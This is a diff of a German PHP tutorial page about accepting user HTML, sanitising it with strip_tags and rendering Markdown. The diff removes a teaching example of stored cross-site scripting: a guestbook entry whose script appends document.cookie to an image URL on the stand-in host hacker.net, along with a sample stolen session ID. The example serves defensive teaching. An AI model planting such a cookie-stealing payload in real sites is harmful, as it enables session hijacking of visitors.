@@ -79,7 +79,7 @@ beliebiges HTML abspeichern können. Herr Lauscher trägt dort ein Bild ein:</p>
 <p>Das Bild wird also nicht von Webserver gustav.at geladen, sondern vom Webserver von
 Herrn Lauscher. Und dort wird gleich ein php-Programm zum Erzeugen des Bildes
 aufgerufen. D.h. Wenn Bernhard Besucher das Gästebuch ansurft
-dann sieht Herr Lauscher einen Zugriff auf bild.php auf seinem Server, und kann 
+dann sieht Herr Lauscher einen Zugriff auf bild.php auf seinem Server, und kann
 das mit-loggen. Falls Herr Lauscher die Gästebuch-Besucher schon
 kennt (ein Cookie bei ihnen gesetzt hat) kann er die Leute auch identifizieren.</p>
 
@@ -97,38 +97,8 @@ vorhergehenden Suche noch ein Cookie haben.)</p>
 
 
 
-<p>Im zweiten Beispiel gibt Frau Hacker neben einem Bild noch etwas Javascript ins
-Gästebuch ein:</p>
-
-<div class="example">
-<pre class="lang-html prettyprint linenums">
-Hallo Welt 
-
-&lt;img src=&quot;http://hacker.net/bild.php&quot; alt=&quot;harmlos&quot; id=&quot;hack_tool&quot; /&gt;
-&lt;script&gt;
-document.getElementById(&quot;hack_tool&quot;).src += &quot;?c=&quot; + document.cookie;
-&lt;/script&gt;
-</pre></div>
-
-<p>Mit der einen Zeile Javascript wir das Cookie an die URL des Bildes angefügt, das Ergebnis ist z.B:</p>
-
-<div class="example">
-<pre class="lang-html prettyprint linenums">
-&lt;img id=&quot;hack_tool&quot; alt=&quot;harmloses bild&quot; 
-src=&quot;http://hacker.net/bild.php?keks=PHPSESSID=6b454e966f9fc9b9a9d5126ffb076115&quot;/&gt;
-</pre></div>
-
-<p>So kann Frau Hacker das Cookie einer BesucherIn des Gästebuchs entwenden. Sie
-kann nun das Cookie verwenden um als eingeloggter User Ihre Seite zu benützen!</p>
-
-<p>Was lernen wir daraus?</p>
-
-<p>Niemals, niemals, niemals zulassen, dass Fremde Javascript in Ihre Site einspeisen können!</p>
-
-
-<a class="slide_break" id="slide-5" href="slide.html#slide-5"  title="Wechsle zur Präsentations-Ansicht, Folie Nr. 5">▻</a>
-
-
+<p>Das zweite Beispiel wäre wieder Eve mit der Cross Site Scripting Attacke,
+die wir im Kapitel <a href="/php-db-schreiben/daten-editieren/">Daten Bearbeiten </a> kennen gelernt haben.</p>
 
 <p>Noch hat unsere Applikation dieses Problem nicht: Wenn Frau Hacker Ihren Code
 z.B. in das Profil einer Person eingibt wir der Code htmlescaped angezeigt und
@@ -136,12 +106,15 @@ z.B. in das Profil einer Person eingibt wir der Code htmlescaped angezeigt und
 
 <p><img src="/images/html-escaped.png" srcset="/images/html-escaped.png 1x, /images/html-escaped1.png 1x"  alt="Eingegebener HTML+Javascript-Code wird escaped und dargestellt" ></p>
 
+<p>Erst wenn wir uns entscheiden von User*innen eingegebens HTML zuzulassen
+müssen wir mit der Gefahr von Cross Site Scripting umgehen!</p>
 
-<a class="slide_break" id="slide-6" href="slide.html#slide-6"  title="Wechsle zur Präsentations-Ansicht, Folie Nr. 6">▻</a>
+
+<a class="slide_break" id="slide-5" href="slide.html#slide-5"  title="Wechsle zur Präsentations-Ansicht, Folie Nr. 5">▻</a>
 
 <h3 id="eingabe-von-html">Eingabe von HTML</h3>
 
-<p>Wenn Sie sich entscheiden die Eingabe von HTML zu zu lassen, 
+<p>Wenn Sie sich entscheiden die Eingabe von HTML zu zu lassen,
 dann können Sie das mit einer einfachen <code>textarea</code> tun.</p>
 
 <p>Mit einem Javascript-Editor wie TinyMCE wird die Eingabe aber sehr
@@ -150,7 +123,7 @@ vereinfacht: TinyMCE verwandelt eine normale Textarea in einen wysiwyg-Editor:</
 <p><img src="/images/tinymce.png" srcset="/images/tinymce.png 1x, /images/tinymce@2x.png 2x"  alt="Normale Textarea (oben) kann mit TinyMCE in einen wysiwyg-Editor (unten) verwandelt werden" ></p>
 
 
-<a class="slide_break" id="slide-7" href="slide.html#slide-7"  title="Wechsle zur Präsentations-Ansicht, Folie Nr. 7">▻</a>
+<a class="slide_break" id="slide-6" href="slide.html#slide-6"  title="Wechsle zur Präsentations-Ansicht, Folie Nr. 6">▻</a>
 
 <h3 id="abspeichern-von-html">Abspeichern von HTML</h3>
 
@@ -167,11 +140,11 @@ $description = strip_tags( $_POST[&#39;description&#39;], &quot;&lt;p&gt;&lt;b&g
 </pre></div>
 
 
-<a class="slide_break" id="slide-8" href="slide.html#slide-8"  title="Wechsle zur Präsentations-Ansicht, Folie Nr. 8">▻</a>
+<a class="slide_break" id="slide-7" href="slide.html#slide-7"  title="Wechsle zur Präsentations-Ansicht, Folie Nr. 7">▻</a>
 
 
 
-<p>Nun können Sie auch die Ausgabe des Profils umstellen und auf das Escapen 
+<p>Nun können Sie auch die Ausgabe des Profils umstellen und auf das Escapen
 der <code>description</code> verzichten:</p>
 
 <div class="example">
@@ -183,7 +156,7 @@ $surname     = htmlspecialchars( $person-&gt;surname      );
 $description = strip_tags( $person-&gt;description,  &quot;&lt;p&gt;&lt;b&gt;&quot; );
 
 echo &lt;&lt;&lt;EOM
-  &lt;p&gt;$anrede $vorname $nachname hat insgesamt 
+  &lt;p&gt;$anrede $vorname $nachname hat insgesamt
   $no Werke in dieser Datenbank.
   $ersie hat den Usernamen $username.&lt;/p&gt;
 
@@ -192,7 +165,7 @@ EOM;
 </pre></div>
 
 
-<a class="slide_break" id="slide-9" href="slide.html#slide-9"  title="Wechsle zur Präsentations-Ansicht, Folie Nr. 9">▻</a>
+<a class="slide_break" id="slide-8" href="slide.html#slide-8"  title="Wechsle zur Präsentations-Ansicht, Folie Nr. 8">▻</a>
 
 <h2 id="markdown">Markdown</h2>
 
@@ -205,14 +178,14 @@ EOM;
 
   Bevor wir das eingegeben HTML abspeichern, wollen wir es
   streng kontrollieren: Im Profil sollen nur die HTML-Tags
-  `&lt;p&gt;` und `&lt;b&gt;` verwendet werden können, mehr nicht. 
+  `&lt;p&gt;` und `&lt;b&gt;` verwendet werden können, mehr nicht.
 </pre></div>
 
 <p>Dieses Format wird in der Datenbank gespeichert. Erst bei
 der Ausgabe als HTML wird Markdown in HTML verwandelt.</p>
 
 
-<a class="slide_break" id="slide-10" href="slide.html#slide-10"  title="Wechsle zur Präsentations-Ansicht, Folie Nr. 10">▻</a>
+<a class="slide_break" id="slide-9" href="slide.html#slide-9"  title="Wechsle zur Präsentations-Ansicht, Folie Nr. 9">▻</a>
 
 <h3 id="markdown-eingeben">Markdown eingeben</h3>
 
@@ -221,7 +194,7 @@ der Ausgabe als HTML wird Markdown in HTML verwandelt.</p>
 <p><img src="simplemde.png"  alt="Screenshot von SimpleMDE" ></p>
 
 
-<a class="slide_break" id="slide-11" href="slide.html#slide-11"  title="Wechsle zur Präsentations-Ansicht, Folie Nr. 11">▻</a>
+<a class="slide_break" id="slide-10" href="slide.html#slide-10"  title="Wechsle zur Präsentations-Ansicht, Folie Nr. 10">▻</a>
 
 <h3 id="markdown-darstellen">Markdown darstellen</h3>
 
@@ -235,6 +208,14 @@ $Parsedown = new Parsedown();
 echo $Parsedown-&gt;text(&#39;## Hello HTML!&#39;);
 </pre></div>
 
+
+<a class="slide_break" id="slide-11" href="slide.html#slide-11"  title="Wechsle zur Präsentations-Ansicht, Folie Nr. 11">▻</a>
+
+<h2 id="siehe-auch">Siehe auch</h2>
+
+<ul>
+  <li>Kapitel über <a href="/security/a3-injection/#slide-7">Cross Site Scripting (XSS)</a></li>
+</ul>
  <div class="pagination">
   <ul>
     
@@ -658,7 +639,7 @@ echo $Parsedown-&gt;text(&#39;## Hello HTML!&#39;);
                       
                     
                       
-                      <li ><a href="/php/php-und-parameter/">In PHP Daten aus Web-Formularen verarbeiten</a></li>
+                      <li ><a href="/php/php-und-parameter/">Daten aus dem Web-Formularen prüfen</a></li>
                       
                     
                       
